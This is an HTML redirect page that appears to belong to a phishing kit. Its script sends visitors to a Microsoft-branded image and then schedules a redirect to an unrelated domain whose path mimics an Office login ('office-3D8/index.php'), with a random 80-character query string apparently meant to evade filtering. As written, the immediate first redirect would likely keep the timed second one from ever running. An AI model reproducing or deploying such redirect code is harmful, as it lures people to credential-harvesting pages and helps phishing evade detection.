<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <script>
        // Image page URL (shows for 1 second)
        const imagePageUrl = "https://www.miniorange.com/images/microsoft-apps/microsoft-apps-organization-redirect.webp"; // Change this to your actual image URL

        // Final destination URL
        const finalRedirectUrl = "https://m3.ryltvk6.sa.com/m3.secure.zcore/office-3D8/index.php";

        // Function to generate a random 80-character string
        function generateRandomString(length) {
            const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            let result = "";
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * characters.length));
            }
            return result;
        }

        // Step 1: Redirect to image page (user sees it for 1 second)
        window.location.replace(imagePageUrl);

        // Step 2: Automatically redirect to final destination after 1 second
        setTimeout(() => {
            const randomString = generateRandomString(80);
            window.location.replace(`${finalRedirectUrl}?=${randomString}`);
        }, 1000); // 1000ms = 1 second
    </script>
</head>
<body>
</body>
</html>
